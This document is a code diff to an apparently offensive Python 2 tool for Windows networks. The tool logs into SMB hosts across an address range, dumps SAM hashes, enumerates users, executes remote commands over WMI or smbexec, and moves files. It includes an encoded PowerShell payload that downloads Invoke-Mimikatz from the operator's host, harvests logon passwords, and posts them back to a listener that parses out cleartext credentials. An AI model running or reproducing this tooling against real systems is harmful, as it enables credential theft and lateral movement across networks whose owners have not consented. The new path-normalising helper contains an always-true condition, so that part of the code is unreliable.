@@ -7,8 +7,7 @@ monkey.patch_all()
 from gevent import sleep
 from gevent.pool import Pool
 from gevent import joinall
-from gevent import lock
-from netaddr import IPNetwork, IPAddress
+from netaddr import IPNetwork, IPRange, IPAddress
 from threading import Thread
 from base64 import b64encode
 from struct import unpack, pack
@@ -25,13 +24,15 @@ from BaseHTTPServer import BaseHTTPRequestHandler
 from argparse import RawTextHelpFormatter
 from binascii import unhexlify, hexlify
 from Crypto.Cipher import DES, ARC4
+from datetime import datetime
 
+import StringIO
+import ntpath
 import socket
 import hashlib
 import BaseHTTPServer
 import logging
 import argparse
-import ntpath
 import ConfigParser
 import traceback
 import random
@@ -189,7 +190,20 @@ class MimikatzServer(BaseHTTPRequestHandler):
         length = int(self.headers.getheader('content-length'))
         data = self.rfile.read(length)
 
-        print data
+        buf = StringIO.StringIO(data).readlines()
+        i = 0
+        while i < len(buf):
+            if ('Password' in buf[i]) and ('(null)' not in buf[i]):
+                passw  = buf[i].split(':')[1].strip()
+                domain = buf[i-1].split(':')[1].strip()
+                user   = buf[i-2].split(':')[1].strip()
+                print '[+] {} Found clear text creds! Domain: {} Username: {} Password: {}'.format(self.client_address[0], domain, user, passw)
+            i += 1
+
+        credsfile_name = 'Mimikatz-{}-{}.log'.format(self.client_address[0], datetime.now().strftime("%Y-%m-%d_%H:%M:%S"))
+        with open(credsfile_name, 'w') as creds:
+            creds.write(data)
+        print "[+] {} Saved POST data to {}".format(self.client_address[0], credsfile_name)
 
 class SMBServer(Thread):
     def __init__(self):
@@ -505,9 +519,9 @@ class RemoteOperations:
         self.__tmpServiceName = None
         self.__serviceDeleted = False
 
-        self.__batchFile = '%TEMP%\\execute.bat'
+        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME 
         self.__shell = '%COMSPEC% /Q /c '
-        self.__output = '%SYSTEMROOT%\\Temp\\__output'
+        self.__output = '%SYSTEMROOT%\\Temp\\' + OUTPUT_FILENAME
         self.__answerTMP = ''
 
     def __connectSvcCtl(self):
@@ -1419,6 +1433,15 @@ class RemoteShellwmi():
         self.__outputBuffer = ''
         return result
 
+def normalize_path(path):
+    path = r'{}'.format(path)
+    path = ntpath.normpath(path)
+    share = path.split('\\')[0]
+    if ':' or '$' in share:
+        path = path.replace(share, '')
+
+    return path
+
 def _listShares(smb):
     permissions = {}
     root = ntpath.normpath("\\{}".format(PERM_DIR))
@@ -1442,24 +1465,22 @@ def _listShares(smb):
 
     return permissions
 
-def mimikatz_command(address):
-    command = """
-    IEX (New-Object Net.WebClient).DownloadString('http://{addr}/Invoke-Mimikatz.ps1');
-    $creds = Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords exit";
-    $request = [System.Net.WebRequest]::Create('http://{addr}');
-    $request.Method = "POST";
-    $request.ContentType = "application/x-www-form-urlencoded";
-    $bytes = [System.Text.Encoding]::ASCII.GetBytes($creds);
-    $request.ContentLength = $bytes.Length;
-    $requestStream = $request.GetRequestStream();
-    $requestStream.Write( $bytes, 0, $bytes.Length );
-    $requestStream.Close();
-    $request.GetResponse();
-    """.format(addr=address)
+def ps_command(command=None, katz_ip=None):
+    if katz_ip:
+        command = """
+        IEX (New-Object Net.WebClient).DownloadString('http://{addr}/Invoke-Mimikatz.ps1');
+        $creds = Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords exit";
+        $request = [System.Net.WebRequest]::Create('http://{addr}');
+        $request.Method = "POST";
+        $request.ContentType = "application/x-www-form-urlencoded";
+        $bytes = [System.Text.Encoding]::ASCII.GetBytes($creds);
+        $request.ContentLength = $bytes.Length;
+        $requestStream = $request.GetRequestStream();
+        $requestStream.Write( $bytes, 0, $bytes.Length );
+        $requestStream.Close();
+        $request.GetResponse();
+        """.format(addr=katz_ip)
 
-    return b64encode(command.encode('UTF-16LE'))
-
-def ps_command(command):
     return b64encode(command.encode('UTF-16LE'))
 
 def connect(host):
@@ -1475,6 +1496,8 @@ def connect(host):
         if not domain:
             domain = smb.getServerName()
 
+        print "[+] {}:{} is running {} (name:{}) (domain:{})".format(host, args.port, smb.getServerOS(), smb.getServerName(), domain)
+
         try:
             smb.logoff()
         except:
@@ -1482,6 +1505,7 @@ def connect(host):
 
     except socket.error as e:
         return
+
     except Exception as e:
         traceback.print_exc()
 
@@ -1494,49 +1518,68 @@ def connect(host):
         smb = SMBConnection(host, host, None, args.port)
         smb.login(args.user, args.passwd, domain, lmhash, nthash)
 
-        if args.mimikatz:
-            args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(mimikatz_command(args.local_ip))
+        if args.download:
+            try:
+                out = open(args.download.split('\\')[-1], 'wb')
+                smb.getFile(args.share, args.download, out.write)
+            except SessionError as e:
+                print '[-] {}:{} {}'.format(host, args.port, e)
 
-        if args.pscommand:
-            args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(ps_command(args.pscommand))
+        if args.delete:
+            try:
+                smb.deleteFile(args.share, args.delete)
+            except SessionError as e:
+                print '[-] {}:{} {}'.format(host, args.port, e)
+
+        if args.upload:
+            try:
+                up = open(args.upload[0] , 'rb')
+                smb.putFile(args.share, args.upload[1], up.read)
+            except SessionError as e:
+                print '[-] {}:{} {}'.format(host, args.port, e)
 
         if args.sam:
-            dsecrets = DumpSecrets(host, args.user, args.passwd, args.domain, args.hash)
-            sam_dump = dsecrets.dump(smb)
+            sec_dump = DumpSecrets(host, args.user, args.passwd, domain, args.hash)
+            sam_dump = sec_dump.dump(smb)
+            print "[+] {}:{} {} Dumping local SAM hashes (uid:rid:lmhash:nthash):".format(host, args.port, domain)
+            for sam_hash in sam_dump:
+                print sam_hash
+            sec_dump.cleanup()
 
         if args.enum_users:
-            user_dump = SAMRDump("{}/SMB".format(args.port), args.user, args.passwd, args.domain, args.hash).dump(host)
+            user_dump = SAMRDump("{}/SMB".format(args.port), args.user, args.passwd, domain, args.hash).dump(host)
+            print "[+] {}:{} {} {} ( LockoutTries={} LockoutTime={} )".format(host, args.port, domain, user_dump['users'], user_dump['lthresh'], user_dump['lduration'])
+
+        if args.mimikatz:
+            args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(ps_command(katz_ip=args.local_ip))
+
+        if args.pscommand:
+            args.command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(ps_command(command=args.pscommand))
 
         if args.command:
 
             if args.execm == 'wmi':
-                executer = WMIEXEC(args.command, args.user, args.passwd, args.domain, args.hash, args.share)
+                executer = WMIEXEC(args.command, args.user, args.passwd, domain, args.hash, args.share)
                 result = executer.run(host, smb)
+                if not args.mimikatz:
+                    print '[+] {}:{} {} Executed specified command via WMI:'.format(host, args.port, domain)
+                    print result
 
             elif args.execm == 'smbexec':
-                executer = CMDEXEC('{}/SMB'.format(args.port), args.user, args.passwd, args.domain, args.hash, args.share, args.command)
+                executer = CMDEXEC('{}/SMB'.format(args.port), args.user, args.passwd, domain, args.hash, args.share, args.command)
                 result = executer.run(host)
+                if not args.mimikatz:
+                    print '[+] {}:{} {} Executed specified command via SMBEXEC:'.format(host, args.port, domain)
+                    print result
 
         if args.list_shares:
             share_list = _listShares(smb)
-
-        tlock.acquire()
-        with tlock:
-            print "[+] {}:{} is running {} (name:{}) (domain:{})".format(host, args.port, smb.getServerOS(), smb.getServerName(), domain)
-            if args.list_shares:
-                print '\tSHARE\t\t\tPermissions'
-                print '\t-----\t\t\t-----------'
-                for share, perm in share_list.iteritems():
-                    print "\t{}\t\t\t{}".format(share, perm)
-
-            if args.enum_users:
-                print "[+] {}:{} {} {} ( LockoutTries={} LockoutTime={} )".format(host, args.port, domain, user_dump['users'], user_dump['lthresh'], user_dump['lduration'])
-
-            if args.sam:
-                for sam_hash in sam_dump:
-                    print sam_hash
-
-        tlock.release()
+            print '[+] {}:{} {} Available shares:'.format(host, args.port, domain)
+            print '\tSHARE\t\t\tPermissions'
+            print '\t-----\t\t\t-----------'
+            for share, perm in share_list.iteritems():
+                print '\t{}\t\t\t{}'.format(share, perm)
+            print '\n'
 
         try:
             smb.logoff()
@@ -1544,14 +1587,15 @@ def connect(host):
             pass
 
     except SessionError as e:
-        print "[+] {}:{} is running {} (name:{}) (domain:{})".format(host, args.port, smb.getServerOS(), smb.getServerName(), domain)
         print "[-] {}:{} {}".format(host, args.port, e)
+        return
+
+    except DCERPCException as e:
+        print "[-] {}:{} DCERPC Error: {}".format(host, args.port, e)
+        return
 
     except socket.error as e:
         return
-
-    except Exception as e:
-        traceback.print_exc()
 
 def concurrency(hosts):
     ''' Open all the greenlet threads '''
@@ -1586,28 +1630,42 @@ if __name__ == '__main__':
     parser.add_argument("-l", type=str, dest='local_ip', help='Local IP address')
     parser.add_argument("target", nargs=1, type=str, help="The target range or CIDR identifier")
 
-    rgroup = parser.add_argument_group("Credential Gathering", "Options for gathering credentials from specified systems")
-    rgroup.add_argument("-sam", action='store_true', dest='sam', help='Dump SAM hashes from target systems')
-    rgroup.add_argument("-M", action='store_true', dest='mimikatz', help='Run Invoke-Mimikatz on target systems')
+    rgroup = parser.add_argument_group("Credential Gathering", "Options for gathering credentials")
+    rgroup.add_argument("--sam", action='store_true', dest='sam', help='Dump SAM hashes from target systems')
+    rgroup.add_argument("--mimikatz", action='store_true', dest='mimikatz', help='Run Invoke-Mimikatz on target systems')
 
-    egroup = parser.add_argument_group("Mapping/Enumeration", "Options for Mapping/Enumerating the specified systems")
+    egroup = parser.add_argument_group("Mapping/Enumeration", "Options for Mapping/Enumerating")
     egroup.add_argument("-S", action="store_true", dest="list_shares", help="List shares")
     egroup.add_argument("-U", action='store_true', dest='enum_users', help='Enumerate users')
 
-    cgroup = parser.add_argument_group("Command Execution", "Options for executing commands on the specified systems")
-    cgroup.add_argument('-execm', choices={"wmi", "smbexec"}, dest="execm", default="wmi", help="Method to execute the command (default: wmi)")
+    cgroup = parser.add_argument_group("Command Execution", "Options for executing commands")
+    cgroup.add_argument('--execm', choices={"wmi", "smbexec"}, dest="execm", default="wmi", help="Method to execute the command (default: wmi)")
     cgroup.add_argument("-x", metavar="COMMAND", dest='command', help="Execute the specified command")
-    cgroup.add_argument("-X", metavar="PSCOMMAND", dest='pscommand', help='Excute the specified powershell command')
+    cgroup.add_argument("-X", metavar="PS_COMMAND", dest='pscommand', help='Excute the specified powershell command')
+
+    bgroup = parser.add_argument_group("Filesystem interaction", "Options for interacting with filesystems")
+    bgroup.add_argument("--download", dest='download', metavar="PATH", help="Download a file from the remote systems")
+    bgroup.add_argument("--upload", nargs=2, dest='upload', metavar=('SRC', 'DST'), help="Upload a file to the remote systems")
+    bgroup.add_argument("--delete", dest="delete", metavar="PATH", help="Delete a remote file")
 
     args = parser.parse_args()
 
     hosts = IPNetwork(args.target[0])
 
-    tlock = lock.RLock()
+    args.download  = normalize_path(args.download)
+    args.delete    = normalize_path(args.delete)
+    if args.upload:
+        args.upload[1] = normalize_path(args.upload[1])
 
-    server = BaseHTTPServer.HTTPServer(('0.0.0.0', 80), MimikatzServer)
-    t = Thread(name='HTTPServer', target=server.serve_forever)
-    t.setDaemon(True)
-    t.start()
+    if args.mimikatz:
+        if not args.local_ip:
+            print '[-] You must specify your local IP with \'-l\''
+            sys.exit()
+
+        print '[*] Note: This might take some time on large networks! Go grab a redbull!\n'
+        server = BaseHTTPServer.HTTPServer(('0.0.0.0', 80), MimikatzServer)
+        t = Thread(name='HTTPServer', target=server.serve_forever)
+        t.setDaemon(True)
+        t.start()
 
     concurrency(hosts)
